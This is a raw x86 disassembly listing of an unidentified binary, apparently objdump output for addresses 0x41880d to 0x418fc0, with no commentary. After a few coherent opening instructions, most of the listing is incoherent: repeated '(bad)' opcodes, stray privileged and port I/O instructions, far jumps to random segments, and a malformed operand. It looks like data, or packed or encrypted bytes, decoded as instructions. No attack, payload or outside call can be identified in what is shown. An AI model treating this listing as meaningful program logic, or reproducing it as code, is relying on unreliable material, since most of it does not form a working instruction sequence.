  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0xffdb1af2
  41883e:	and    eax,0x7f3e17c2
  418843:	js     0x4188c0
  418845:	jle    0x4188bf
  418847:	js     0x41880d
  418849:	lock mov ah,0x6c
  41884c:	je     0x418895
  41884e:	dec    edx
  41884f:	ud1    ebp,DWORD PTR [edi]
  418852:	dec    ecx
  418853:	fld    QWORD PTR [esi]
  418855:	sbb    al,0x7f
  418857:	mov    esi,ebx
  418859:	push   es
  41885a:	rol    dl,1
  41885c:	sbb    BYTE PTR [edi+0x25],al
  41885f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418860:	push   esp
  418861:	in     eax,dx
  418862:	mov    bl,0xc1
  418864:	pop    edi
  418865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418867:	(bad)  [ebx+0x33]
  41886a:	sub    eax,0xd3ade6b1
  41886f:	pop    edi
  418870:	shl    DWORD PTR [ecx-0x102d2682],cl
  418876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418877:	cmp    BYTE PTR ds:0x470a1b3a,ch
  41887d:	dec    ebp
  41887e:	sub    al,0xe6
  418880:	shl    BYTE PTR [eax-0x7026c5e4],1
  418886:	cdq    
  418887:	pop    edx
  418888:	sbb    eax,0x24a8bd7c
  41888d:	push   0x9
  41888f:	add    eax,ebx
  418891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418892:	iret   
  418893:	test   al,0x2b
  418895:	or     ebp,eax
  418897:	loop   0x4188f9
  418899:	ins    DWORD PTR es:[edi],dx
  41889a:	psrld  mm0,QWORD PTR [ebx+0x7f]
  41889e:	sbb    BYTE PTR [ebx+0x40],ch
  4188a1:	push   ss
  4188a2:	call   0xfa1ba191
  4188a7:	mov    ecx,0x357a3fd2
  4188ac:	das    
  4188ad:	push   esi
  4188ae:	inc    eax
  4188af:	js     0x4188df
  4188b1:	inc    eax
  4188b2:	mov    esi,0x95e7a96f
  4188b7:	pop    ss
  4188b8:	rol    BYTE PTR [esi+0x2a9fde75],cl
  4188be:	(bad)  
  4188bf:	leave  
  4188c0:	mov    DWORD PTR [eax+eax*1+0x654248ce],eax
  4188c7:	lods   eax,DWORD PTR ds:[esi]
  4188c8:	les    esi,FWORD PTR [edi]
  4188ca:	and    DWORD PTR [ecx-0x66],0xba1c9a2c
  4188d1:	pop    edi
  4188d2:	push   esi
  4188d3:	sahf   
  4188d4:	adc    eax,0x7e97598d
  4188d9:	hlt    
  4188da:	xchg   ecx,eax
  4188db:	adc    DWORD PTR [edx-0x4fc0110],ebx
  4188e1:	xor    bh,BYTE PTR [esi]
  4188e3:	mov    WORD PTR [ecx-0x1555ae69],fs
  4188e9:	loopne 0x41895d
  4188eb:	xchg   ebp,eax
  4188ec:	pop    eax
  4188ed:	dec    esi
  4188ee:	lods   eax,DWORD PTR ds:[esi]
  4188ef:	and    bl,dl
  4188f1:	mov    dl,0x0
  4188f3:	pop    ebp
  4188f4:	fld    QWORD PTR [edx-0x7805cb0b]
  4188fa:	inc    ebx
  4188fb:	and    ebp,esp
  4188fd:	push   eax
  4188fe:	fidiv  DWORD PTR [ebp+eiz*8-0x1a]
  418902:	(bad)  
  418903:	rcl    DWORD PTR [ebx-0x448395ae],0x40
  41890a:	pop    es
  41890b:	ds fwait
  41890d:	adc    dl,BYTE PTR ds:0xbbb80fa8
  418913:	adc    edi,DWORD PTR [ebx+ebp*4-0x62a50808]
  41891a:	ins    BYTE PTR es:[edi],dx
  41891b:	out    dx,al
  41891c:	fs hlt 
  41891e:	push   edx
  41891f:	sub    BYTE PTR [edx+0x18d31ab],ah
  418925:	push   esi
  418926:	cli    
  418927:	dec    ebp
  418928:	jno    0x418947
  41892a:	aam    0xdd
  41892c:	pop    eax
  41892d:	pop    ebx
  41892e:	mov    WORD PTR [ecx-0x4e],gs
  418931:	enter  0x756f,0x13
  418935:	leave  
  418936:	mov    esp,DWORD PTR [ebx-0x73f2307d]
  41893c:	dec    ecx
  41893d:	sahf   
  41893e:	stos   DWORD PTR es:[edi],eax
  41893f:	or     BYTE PTR [edi+0x3d],0x8d
  418943:	in     eax,0x2c
  418945:	jmp    0xa5e1:0x86b55cd6
  41894c:	scas   eax,DWORD PTR es:[edi]
  41894d:	mov    ecx,0x5067a79e
  418952:	and    BYTE PTR [ecx],bl
  418954:	inc    edx
  418955:	add    DWORD PTR [edi-0x44],ecx
  418958:	test   DWORD PTR [edx],esp
  41895a:	jle    0x418984
  41895c:	mov    WORD PTR [esi+0x56],fs
  41895f:	das    
  418960:	dec    edx
  418961:	dec    edi
  418962:	shl    BYTE PTR [eax],0xcc
  418965:	ja     0x418979
  418967:	and    BYTE PTR [edi+edi*2],0xd3
  41896b:	fsqrt  
  41896d:	add    bl,BYTE PTR [ebx-0x7]
  418970:	ds inc ecx
  418972:	je     0x4188f9
  418974:	es pop ebx
  418976:	in     al,dx
  418977:	jmp    0x418976
  418979:	ins    DWORD PTR es:[edi],dx
  41897a:	aam    0x91
  41897c:	hlt    
  41897d:	mov    ebp,edi
  41897f:	aad    0x81
  418981:	push   edi
  418982:	pop    ebp
  418983:	retf   0xb2aa
  418986:	and    esp,DWORD PTR [ecx]
  418988:	ret    0x267e
  41898b:	dec    edi
  41898c:	sahf   
  41898d:	xlat   BYTE PTR ds:[ebx]
  41898e:	sub    edx,DWORD PTR [esi-0x24]
  418991:	adc    al,0xd4
  418993:	mov    eax,0x6a9a5925
  418998:	adc    DWORD PTR [ecx+0x4b4bcc28],ebp
  41899e:	je     0x418934
  4189a0:	mov    al,ds:0x81bf3fae
  4189a5:	inc    esi
  4189a6:	push   ds
  4189a7:	popw   ss
  4189a9:	xor    cl,dh
  4189ab:	cmp    al,0x5f
  4189ad:	pop    edx
  4189ae:	or     edx,DWORD PTR [eax+0x145db18a]
  4189b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b5:	in     eax,dx
  4189b6:	mov    ecx,0x6d606abd
  4189bb:	mov    ch,0x2
  4189bd:	cmp    edi,ebx
  4189bf:	cmp    eax,0x8d8bce78
  4189c4:	imul   edx,DWORD PTR [ecx],0xffffffe0
  4189c7:	and    ch,dl
  4189c9:	push   0xab60facc
  4189ce:	mov    dh,0x3a
  4189d0:	xor    DWORD PTR [esi+0x5ccd3762],ebp
  4189d6:	mov    cl,BYTE PTR es:[ecx-0x42436eb8]
  4189dd:	and    ecx,DWORD PTR [ecx]
  4189df:	and    BYTE PTR [eax-0x54],al
  4189e2:	fcomip st,st(2)
  4189e4:	push   ds
  4189e5:	fidiv  DWORD PTR [ecx]
  4189e7:	sub    BYTE PTR [ebx],al
  4189e9:	stos   BYTE PTR es:[edi],al
  4189ea:	shr    BYTE PTR [eax+0x6e3bdcad],1
  4189f0:	setb   BYTE PTR [esp+esi*1-0x75]
  4189f5:	sbb    ebp,DWORD PTR [esi+0x50681d56]
  4189fb:	inc    edx
  4189fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189fd:	or     BYTE PTR [edi],ah
  4189ff:	sub    DWORD PTR [eax],ebp
  418a01:	mov    ds:0x5d0f1c9,eax
  418a06:	sahf   
  418a07:	jmp    0x2aefb487
  418a0c:	push   esp
  418a0d:	sbb    eax,0xff0fc56
  418a12:	cli    
  418a13:	out    0x2c,eax
  418a15:	mov    ds:0x75cfbb9f,al
  418a1a:	adc    al,0xe1
  418a1c:	mov    eax,0xfcec4bdb
  418a21:	cmp    eax,0xc4a4f9ba
  418a26:	(bad)  
  418a27:	cmp    esp,eax
  418a29:	jno    0x418a07
  418a2b:	rcl    DWORD PTR [esi-0x57],cl
  418a2e:	push   ecx
  418a2f:	dec    DWORD PTR [edi+edx*2-0x76]
  418a33:	jae    0x418a46
  418a35:	add    eax,ebx
  418a37:	cmp    al,BYTE PTR [eax+0x2fcd2e9f]
  418a3d:	pop    ds
  418a3e:	mov    ebp,0x11ec5002
  418a43:	mov    bl,0xd2
  418a45:	ficomp DWORD PTR [ebp-0x7]
  418a48:	rcl    BYTE PTR [eax],0x2e
  418a4b:	dec    eax
  418a4c:	in     eax,dx
  418a4d:	pop    ecx
  418a4e:	jo     0x4189e1
  418a50:	push   es
  418a51:	push   ss
  418a52:	repz popa 
  418a54:	int3   
  418a55:	dec    esi
  418a56:	and    eax,0xa0176376
  418a5b:	dec    edx
  418a5c:	sti    
  418a5d:	aaa    
  418a5e:	mov    eax,ds:0x4f9ef44c
  418a63:	sub    DWORD PTR fs:0x8304cd69,ecx
  418a6a:	in     al,dx
  418a6b:	sbb    DWORD PTR [ecx],ebx
  418a6d:	mov    esi,0x672771e0
  418a72:	addr16 nop
  418a74:	js     0x418a71
  418a76:	shr    ecx,cl
  418a78:	mov    gs,WORD PTR [eax]
  418a7a:	xchg   ebp,eax
  418a7b:	imul   edx,DWORD PTR [ebx-0x7],0xe5dca5ca
  418a82:	fisttp QWORD PTR [edx+esi*2]
  418a85:	aaa    
  418a86:	pop    edi
  418a87:	cmc    
  418a88:	or     dl,BYTE PTR [esp+ebx*2+0x75e5f7ab]
  418a8f:	sub    edi,edi
  418a91:	cwde   
  418a92:	lods   eax,DWORD PTR ds:[esi]
  418a93:	fdiv   QWORD PTR [ebx-0x3f65d7bd]
  418a99:	dec    eax
  418a9a:	dec    ecx
  418a9b:	jge    0x418a25
  418a9d:	sub    BYTE PTR [ebx],ah
  418a9f:	ins    BYTE PTR es:[edi],dx
  418aa0:	jmp    0x10e9:0x8c79a3f9
  418aa7:	jns    0x418b1f
  418aa9:	mov    cs,esp
  418aab:	or     DWORD PTR [edx-0x14],esp
  418aae:	not    BYTE PTR [eax+0x101130a1]
  418ab4:	call   0xf66ab955
  418ab9:	mov    edi,0x84e40eb8
  418abe:	jge    0x418ab0
  418ac0:	and    eax,0x4b20fbc1
  418ac5:	fadd   DWORD PTR [edx-0xce23d83]
  418acb:	inc    esi
  418acc:	inc    eax
  418acd:	mov    eax,ds:0x61b7adad
  418ad2:	mov    eax,ds:0xc2eb3f8a
  418ad7:	and    BYTE PTR gs:[ebx],ch
  418ada:	rcr    BYTE PTR [ebp+0x659e0442],1
  418ae0:	mov    dh,0x8c
  418ae2:	or     edi,DWORD PTR [esi-0x1a]
  418ae5:	leave  
  418ae6:	rcr    edx,0xe2
  418ae9:	fdiv   st(6),st
  418aeb:	scas   eax,DWORD PTR es:[edi]
  418aec:	mov    cl,0x34
  418aee:	out    dx,eax
  418aef:	dec    ecx
  418af1:	loop   0x418a97
  418af3:	push   ebx
  418af4:	xor    eax,0xaf1c64
  418af9:	cmp    edi,DWORD PTR [edx+0x373a7d0f]
  418aff:	xchg   edx,eax
  418b00:	mov    BYTE PTR [ebx],bl
  418b02:	jbe    0x418b6a
  418b04:	jmp    0x159:0x47357f4e
  418b0b:	call   FWORD PTR [edi+0x70]
  418b0e:	and    ah,BYTE PTR [ebx+0xf]
  418b11:	test   BYTE PTR [esi],ch
  418b13:	sbb    edx,DWORD PTR [ecx-0x6fa32a91]
  418b19:	pop    es
  418b1a:	push   es
  418b1b:	repz sahf 
  418b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b1e:	ret    
  418b1f:	add    BYTE PTR fs:[ecx-0x6b651124],bh
  418b26:	push   0xc7826d90
  418b2b:	mov    dl,0x41
  418b2d:	clc    
  418b2e:	mov    bh,BYTE PTR [edx+edx*4]
  418b31:	jbe    0x418ae7
  418b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b34:	dec    esi
  418b35:	cwde   
  418b36:	mov    cl,0xbc
  418b38:	mov    ?,WORD PTR [ebx]
  418b3a:	xor    ebp,DWORD PTR [ebx+ecx*4-0x31]
  418b3e:	jg     0x418b83
  418b40:	bound  edi,QWORD PTR [eax]
  418b42:	xchg   esi,eax
  418b43:	fs in  al,0xff
  418b46:	xor    eax,0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	mov    al,0x9c
  418b64:	ret    
  418b65:	dec    eax
  418b66:	adc    al,bl
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	(bad)  
  418b6f:	push   eax
  418b70:	(bad)  
  418b71:	loope  0x418b81
  418b73:	cmp    ah,BYTE PTR [esi-0x64d1269d]
  418b79:	ins    DWORD PTR es:[edi],dx
  418b7a:	inc    esi
  418b7b:	and    ch,0x23
  418b7e:	push   0xffffffea
  418b80:	or     DWORD PTR [ebx-0x1d],0xa6d2e9b2
  418b87:	cs xchg ecx,eax
  418b89:	sbb    eax,0x954936d2
  418b8e:	mov    dl,0xa7
  418b90:	mov    al,0x8a
  418b92:	mov    dl,0x9
  418b94:	int    0x85
  418b96:	push   esp
  418b97:	loopne 0x418bee
  418b99:	inc    esp
  418b9a:	pcmpgtb mm3,QWORD PTR [ebx+0x4ea625a0]
  418ba1:	dec    edx
  418ba2:	jmp    0xe175:0x5c810489
  418ba9:	jl     0x418bfa
  418bab:	inc    dh
  418bad:	rcl    BYTE PTR [eax+ebx*1-0x77],0xbb
  418bb2:	push   edi
  418bb3:	shr    DWORD PTR [edi-0x828a199],0x5
  418bba:	sub    al,ah
  418bbc:	adc    ebp,ecx
  418bbe:	or     eax,0xa9c4f33b
  418bc3:	pop    esi
  418bc4:	inc    ebx
  418bc5:	jg     0x418bad
  418bc7:	addr16 aam 0xb9
  418bca:	retf   
  418bcb:	jg     0x418b4e
  418bcd:	and    eax,0xd7b38f90
  418bd2:	and    bl,dh
  418bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bd5:	mov    edx,0x468e5e18
  418bda:	inc    edx
  418bdb:	call   0xd956:0xf1f79934
  418be2:	mov    edx,0x24e6d758
  418be7:	xlat   BYTE PTR ds:[ebx]
  418be8:	retf   0x73d
  418beb:	xor    bl,BYTE PTR [ebx+0x4919f5ad]
  418bf1:	arpl   sp,dx
  418bf3:	add    al,0x48
  418bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bf6:	jl     0x418c2f
  418bf8:	out    0xc8,eax
  418bfa:	cmp    al,0x8f
  418bfc:	cmp    BYTE PTR [ebx-0x11fd1fdf],0x77
  418c03:	outs   dx,BYTE PTR ds:[esi]
  418c04:	sub    esp,DWORD PTR [eax-0x17]
  418c07:	sbb    al,0x34
  418c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c0a:	js     0x418bad
  418c0c:	mov    BYTE PTR [ebp-0x4fc3b7e4],bh
  418c12:	add    DWORD PTR [esi+0x3407567f],0xffffffda
  418c19:	loop   0x418bc7
  418c1b:	xor    BYTE PTR [ebp+0x37bbfbf0],ah
  418c21:	mov    ebx,0xbcc4db32
  418c26:	push   ss
  418c27:	sub    al,0xce
  418c29:	imul   esp,DWORD PTR [edx+0x0],0xffffff90
  418c2d:	sbb    eax,0x29d76b2e
  418c32:	aam    0x91
  418c34:	pop    es
  418c35:	mov    edx,0x1cd10835
  418c3a:	mov    ebx,0xd2ff8b9f
  418c3f:	lsl    ebp,WORD PTR [ecx+0x7126ae68]
  418c46:	(bad)  
  418c48:	add    DWORD PTR [edx+0x73],0xffffffc4
  418c4c:	leave  
  418c4d:	ror    DWORD PTR [edx],1
  418c4f:	int3   
  418c50:	cmp    dh,ch
  418c52:	cs (bad) 
  418c54:	push   edx
  418c55:	pop    es
  418c56:	sbb    DWORD PTR [ebp-0x7d],ecx
  418c59:	pop    esp
  418c5a:	pop    eax
  418c5b:	out    0x6,eax
  418c5d:	or     DWORD PTR [eax+edx*8],ebx
  418c60:	out    dx,eax
  418c61:	dec    BYTE PTR [ebp+0x4a00930]
  418c67:	call   0x8c175dc3
  418c6c:	popa   
  418c6d:	push   cs
  418c6e:	imul   edx,esp,0xc39646ea
  418c74:	xchg   esp,eax
  418c75:	dec    esi
  418c76:	icebp  
  418c77:	sbb    edi,DWORD PTR ds:0x31ee186d
  418c7d:	imul   ebx,DWORD PTR [eax+esi*1-0xacab9a0],0x79
  418c85:	pop    es
  418c86:	jg     0x418cdd
  418c88:	stos   DWORD PTR es:[edi],eax
  418c89:	nop
  418c8a:	add    ch,0x38
  418c8d:	sbb    al,0xfb
  418c8f:	and    al,0xd9
  418c91:	inc    edx
  418c92:	in     al,0xb1
  418c94:	aas    
  418c95:	ds jmp 0x8f2e:0x4aeffbc7
  418c9d:	sbb    eax,0x636c84b8
  418ca2:	mov    ecx,0x5b6c02b2
  418ca7:	sbb    dl,ch
  418ca9:	pop    edi
  418caa:	pop    eax
  418cab:	pop    ebx
  418cac:	shl    DWORD PTR [edx+ebp*8],0x66
  418cb0:	fwait
  418cb1:	aaa    
  418cb2:	imul   esi,DWORD PTR [ebp+0x7cfd2cca],0xffffffbb
  418cb9:	daa    
  418cba:	xor    ebp,esp
  418cbc:	push   0xffffffd5
  418cbe:	aas    
  418cbf:	rol    ecx,1
  418cc1:	or     eax,0xd318b2c4
  418cc6:	adc    ch,bl
  418cc8:	mov    eax,0x4e3315c7
  418ccd:	repnz in al,0xfd
  418cd0:	inc    ebx
  418cd1:	in     al,0x8d
  418cd3:	loope  0x418cde
  418cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cd6:	(bad)  
  418cd7:	mov    ah,0x5c
  418cd9:	nop
  418cda:	sub    edx,esp
  418cdc:	dec    eax
  418cdd:	jbe    0x418d38
  418cdf:	inc    ebp
  418ce0:	add    al,0xf7
  418ce2:	sub    DWORD PTR [edx+0x16],0x61
  418ce6:	pop    eax
  418ce7:	and    DWORD PTR [edi-0x2a],0x35f9bebe
  418cee:	ins    DWORD PTR es:[edi],dx
  418cef:	dec    ecx
  418cf0:	ins    DWORD PTR es:[edi],dx
  418cf1:	in     eax,dx
  418cf2:	fdiv   DWORD PTR [edi]
  418cf4:	mov    bh,cl
  418cf6:	stos   BYTE PTR es:[edi],al
  418cf7:	jle    0x418d35
  418cf9:	inc    ebx
  418cfa:	loope  0x418d31
  418cfc:	fsub   st,st(0)
  418cfe:	push   0xdaac02ca
  418d03:	adc    eax,0xbcd3844f
  418d08:	daa    
  418d09:	push   ebp
  418d0a:	pop    ecx
  418d0b:	add    esp,edi
  418d0d:	(bad)  
  418d0e:	and    esp,DWORD PTR [esi-0x243bcf25]
  418d14:	jmp    0x418cdd
  418d16:	(bad)  [ebp-0xcb72763]
  418d1c:	popf   
  418d1d:	dec    esi
  418d1e:	adc    BYTE PTR [edx-0x3adba69f],0xcd
  418d25:	(bad)  
  418d26:	sar    DWORD PTR [ecx],1
  418d28:	shr    dl,1
  418d2a:	int3   
  418d2b:	fsubr  DWORD PTR [edx-0x4e5d72b9]
  418d31:	aam    0x13
  418d33:	push   edi
  418d34:	adc    DWORD PTR [edi+0xf],edx
  418d37:	xor    BYTE PTR [esi-0x4ced58e8],ah
  418d3d:	(bad)  
  418d3e:	inc    edi
  418d3f:	cli    
  418d40:	lods   eax,DWORD PTR ds:[esi]
  418d41:	mov    eax,ds:0xefc79754
  418d46:	neg    DWORD PTR [edx-0x45]
  418d49:	push   ecx
  418d4a:	nop
  418d4b:	ins    DWORD PTR es:[edi],dx
  418d4c:	mov    edi,0x71fecb79
  418d51:	mov    ebx,0xbd7825cf
  418d56:	repnz add BYTE PTR [eax+0x234df30e],ah
  418d5d:	in     al,dx
  418d5e:	imul   DWORD PTR [eax-0x2c]
  418d61:	pusha  
  418d62:	shl    BYTE PTR [edx+0x2f],0xa4
  418d66:	stos   DWORD PTR es:[edi],eax
  418d67:	xor    bh,ch
  418d69:	test   DWORD PTR [edx],ebp
  418d6b:	jecxz  0x418d89
  418d6d:	jp     0x418d5a
  418d6f:	mov    ds:0xedb17c2f,eax
  418d74:	sub    DWORD PTR [edi+0x7],eax
  418d77:	fadd   QWORD PTR [ecx-0x61e0acd0]
  418d7d:	mov    ecx,0xe18b9ef
  418d82:	pop    eax
  418d83:	inc    ebx
  418d84:	jle    0x418d87
  418d86:	test   al,0x57
  418d88:	jnp    0x418dd2
  418d8a:	and    DWORD PTR [ecx+edi*4-0x2b88b72e],edi
  418d91:	data16 (bad) 
  418d93:	mov    dl,0x86
  418d95:	sti    
  418d96:	jne    0x418dd2
  418d98:	jo     0x418dba
  418d9a:	std    
  418d9b:	into   
  418d9c:	fstp   TBYTE PTR [ecx]
  418d9e:	mov    esp,0x75afb182
  418da3:	ins    BYTE PTR es:[edi],dx
  418da4:	fs test al,0xb5
  418da7:	mov    BYTE PTR [ebp+0x2ce4ca1e],bl
  418dad:	pop    esp
  418dae:	xchg   ebx,eax
  418daf:	mov    dl,bh
  418db1:	push   ecx
  418db2:	jge    0x418de9
  418db4:	cld    
  418db5:	ficom  DWORD PTR [ecx+ecx*2-0x17]
  418db9:	mov    ch,0xd6
  418dbb:	dec    esp
  418dbc:	dec    ebx
  418dbd:	iret   
  418dbe:	mov    cl,0x0
  418dc0:	and    al,0xdc
  418dc2:	scas   al,BYTE PTR es:[edi]
  418dc3:	and    BYTE PTR [edx-0x71],al
  418dc6:	lods   al,BYTE PTR ds:[esi]
  418dc7:	rcl    DWORD PTR [ecx-0x24c854f6],cl
  418dcd:	call   0xf57a:0x16246bba
  418dd4:	adc    ecx,DWORD PTR [ecx-0x2aa9ad20]
  418dda:	arpl   WORD PTR [eax+0x42],cx
  418ddd:	inc    esi
  418dde:	out    0xb2,al
  418de0:	dec    ecx
  418de1:	jnp    0x418d7e
  418de3:	cmp    BYTE PTR [esi-0x64],cl
  418de6:	jns    0x418e41
  418de8:	push   edx
  418de9:	add    cl,BYTE PTR [eax]
  418deb:	sub    cl,BYTE PTR [ebp-0xcd0164a]
  418df1:	adc    eax,0xc8ef87cd
  418df6:	enter  0xd64b,0xa8
  418dfa:	sti    
  418dfb:	sub    eax,0xd3fb13ac
  418e00:	lahf   
  418e01:	push   es
  418e02:	sub    dx,WORD PTR [edx]
  418e05:	jb     0x418e83
  418e07:	test   ebx,ebx
  418e09:	aas    
  418e0a:	sbb    al,0x77
  418e0c:	lods   al,BYTE PTR ds:[esi]
  418e0d:	bound  esp,QWORD PTR [eax-0x8c74c66]
  418e13:	push   es
  418e14:	and    eax,0xf2e86eba
  418e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e1a:	pop    DWORD PTR [ebp-0x71d7b141]
  418e20:	jno    0x418e47
  418e22:	mov    BYTE PTR [edi+0x67d897e],cl
  418e28:	inc    edx
  418e29:	sub    al,0x8b
  418e2b:	jnp    0x418e00
  418e2d:	out    0x76,al
  418e2f:	es ins DWORD PTR es:[edi],dx
  418e31:	(bad)  [esp+ecx*4]
  418e34:	and    al,BYTE PTR [esi]
  418e36:	jge    0x418e7b
  418e38:	jnp    0x418e7d
  418e3a:	rol    BYTE PTR [edi-0x49],1
  418e3d:	cmp    al,0x1a
  418e3f:	out    dx,al
  418e40:	sub    DWORD PTR [esi+0x60],0x50519abc
  418e47:	jge    0x418e2b
  418e49:	retf   
  418e4a:	push   esi
  418e4b:	inc    ebp
  418e4c:	ret    0xd863
  418e4f:	xor    si,WORD PTR [esi]
  418e52:	imul   DWORD PTR [eax]
  418e54:	daa    
  418e55:	mov    eax,ds:0x87911b93
  418e5a:	cmp    eax,0xcc49df08
  418e5f:	iret   
  418e60:	ins    BYTE PTR es:[edi],dx
  418e61:	adc    eax,0xdd5edec8
  418e66:	shr    BYTE PTR [ebp-0x56],0x3
  418e6a:	push   DWORD PTR gs:[eax]
  418e6d:	mov    eax,DWORD PTR [ebp+0x10]
  418e70:	jmp    0x41918a
  418e75:	retf   
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	or     edx,DWORD PTR [edi+0x27]
  418e84:	leave  
  418e85:	or     eax,0x7b787fc0
  418e8a:	jle    0x418f04
  418e8c:	js     0x418e87
  418e8e:	cld    
  418e8f:	out    dx,al
  418e90:	fist   DWORD PTR [ebx]
  418e92:	in     al,dx
  418e93:	cmp    BYTE PTR [eax],bh
  418e95:	sbb    DWORD PTR [eax+0x19],eax
  418e98:	jecxz  0x418e6d
  418e9a:	xor    BYTE PTR [edi+eax*2],dh
  418e9d:	xchg   esp,eax
  418e9e:	div    BYTE PTR [edx+0xf]
  418ea1:	inc    eax
  418ea2:	repz je 0x418e9f
  418ea5:	or     ah,cl
  418ea7:	pop    ecx
  418ea8:	pop    ebx
  418ea9:	lods   al,BYTE PTR ds:[esi]
  418eaa:	shl    esp,0x8
  418ead:	mov    al,0xf3
  418eaf:	sbb    al,0x95
  418eb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eb2:	ss cmp al,0x29
  418eb5:	jb     0x418f05
  418eb7:	data16 aad 0x66
  418eba:	push   esp
  418ebb:	mov    cl,0xea
  418ebd:	xchg   esi,eax
  418ebe:	je     0x418e92
  418ec0:	fs gs add eax,0x727b5f32
  418ec7:	out    dx,eax
  418ec8:	and    DWORD PTR [edx],ebx
  418eca:	push   esp
  418ecb:	stc    
  418ecc:	mov    edi,0xb376b3e3
  418ed1:	xor    ah,ch
  418ed3:	outs   dx,DWORD PTR ds:[esi]
  418ed4:	fwait
  418ed5:	mov    ds:0xa05c518f,eax
  418eda:	loope  0x418f4f
  418edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418edd:	push   esi
  418ede:	aad    0xb9
  418ee0:	inc    ebx
  418ee1:	pop    eax
  418ee2:	jne    0x418e85
  418ee4:	push   esi
  418ee5:	push   edx
  418ee6:	mov    edi,DWORD PTR [esi+0x7a]
  418ee9:	dec    esi
  418eea:	loope  0x418ebd
  418eec:	add    ebx,DWORD PTR [edi]
  418eee:	sub    al,0x76
  418ef0:	adc    eax,0xa32ea7c8
  418ef5:	or     DWORD PTR [edx-0x49b96923],0xffffff80
  418efc:	retf   
  418efd:	fist   WORD PTR [esi-0x6d773ca7]
  418f03:	mov    dl,0x5e
  418f05:	mov    eax,0x9fc155d8
  418f0a:	mov    ebx,0x5d79fe83
  418f0f:	mov    bh,0xd2
  418f11:	push   eax
  418f12:	out    dx,eax
  418f13:	int3   
  418f14:	(bad)  
  418f15:	ins    BYTE PTR es:[edi],dx
  418f16:	dec    edi
  418f17:	js     0x418ec6
  418f19:	xchg   edx,eax
  418f1a:	push   edx
  418f1b:	xchg   ecx,eax
  418f1c:	jnp    0x418f82
  418f1e:	out    0x64,al
  418f20:	je     0x418ea4
  418f22:	dec    ebp
  418f23:	adc    al,0xff
  418f25:	xchg   ebx,eax
  418f26:	mov    dl,0x8a
  418f28:	xchg   esi,eax
  418f29:	arpl   WORD PTR [eax+0x602b5511],sp
  418f2f:	push   es
  418f30:	int    0xc1
  418f32:	dec    ebx
  418f33:	mov    ah,0xd6
  418f35:	fimul  WORD PTR es:[edx+0x7a7fb2e]
  418f3c:	pop    es
  418f3d:	push   0xffffffc4
  418f3f:	not    BYTE PTR [ecx+ebx*8+0x57]
  418f43:	js     0x418fa4
  418f45:	jp     0x418ef8
  418f47:	sub    edi,DWORD PTR [eax+0x3b]
  418f4a:	cmp    eax,0x51074cc5
  418f4f:	inc    esp
  418f50:	loop   0x418f9a
  418f52:	or     eax,0xd309a511
  418f57:	sub    ebp,esp
  418f59:	cmp    al,0x81
  418f5b:	sbb    DWORD PTR [ebp+0x6712b8a1],ebx
  418f61:	loope  0x418f67
  418f63:	pop    ebp
  418f64:	dec    ebx
  418f65:	mov    ebx,0xaf0df050
  418f6a:	add    DWORD PTR [ecx+ebx*2+0x7d],ebx
  418f6e:	icebp  
  418f6f:	les    eax,FWORD PTR [esi+0x68]
  418f72:	jge    0x418f22
  418f74:	mov    DWORD PTR [edi+0x7eafda9f],ebp
  418f7a:	fsub   st(5),st
  418f7c:	cmp    al,0xbc
  418f7e:	push   es
  418f7f:	ret    
  418f80:	sahf   
  418f81:	adc    al,0x57
  418f83:	push   DWORD PTR [ebp+0x2c]
  418f86:	push   0x3b59b12b
  418f8b:	mov    dh,0x14
  418f8d:	adc    cl,BYTE PTR [ecx+0x52647ee1]
  418f93:	clc    
  418f94:	jbe    0x418fd4
  418f96:	xor    eax,0xb4b7c4e0
  418f9b:	inc    eax
  418f9c:	xchg   esp,eax
  418f9d:	call   edi
  418f9f:	xchg   esi,eax
  418fa1:	sub    eax,0xe069221e
  418fa6:	sub    eax,0x92baee9f
  418fab:	xor    al,BYTE PTR [eax]
  418fad:	jb     0x41901b
  418faf:	(bad)  
  418fb0:	push   esi
  418fb1:	fwait
  418fb2:	mov    cl,0x6c
  418fb4:	lea    edi,[ebx]
  418fb6:	pop    ss
  418fb7:	je     0x418fd9
  418fb9:	sbb    edi,DWORD PTR [esi]
  418fbb:	xor    ecx,DWORD PTR [edi]
  418fbd:	stos   BYTE PTR es:[edi],al
  418fbe:	jp     0x419006
  418fc0:	xlat   BYTE PTR cs:[ebx]
